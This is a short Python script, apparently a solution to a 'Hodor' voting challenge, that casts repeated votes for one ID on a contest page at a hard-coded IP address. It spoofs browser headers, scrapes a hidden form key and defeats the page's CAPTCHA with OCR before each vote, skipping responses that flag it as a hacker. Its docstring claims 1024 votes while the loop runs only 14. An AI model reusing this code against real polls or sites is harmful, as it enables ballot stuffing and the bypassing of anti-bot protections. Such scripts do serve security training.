#!/usr/bin/python3
""" Voting 1024 times in Hodor contest """
import requests
from bs4 import BeautifulSoup


ID = 3393
url = "http://158.69.76.135/level3.php"
ip_direction = "http://158.69.76.135"
directory = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': ''
}
User_Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit"
User_Agent += "/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
If_none_match = "oun53Fx3Gv2rMXFKHCOgbD2hEes="
header = {
    'User-Agent': User_Agent,
    'If-None-Match': If_none_match,
    'referer': url
}


def get_captcha(path):
    """Function to get the captcha string implmementing OCRI"""
    import os
    import pytesseract

    with open("captcha.png", "wb") as image:
        image.write(session.get(path).content)
        image.close()
    value = pytesseract.image_to_string("captcha.png")
    os.remove("captcha.png")
    return value


if __name__ == '__main__':
    counter = 0
    while counter < 14:
        session = requests.Session()
        response = session.get(url, headers=header)
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.form
        # Catching key value
        input = form.find("input", {"name": "key"})

        key = input["value"]
        directory['key'] = key

        # Catching complete url of captcha content
        path = ip_direction + form.find("img")['src']
        directory["captcha"] = get_captcha(path)\
            .split(" ")[0].split("\n")[0]

        obj = session.post(url, headers=header, data=directory)
        if len(str(obj.content)) > 29:  # Avoid de msj of see you later hacker
            counter += 1
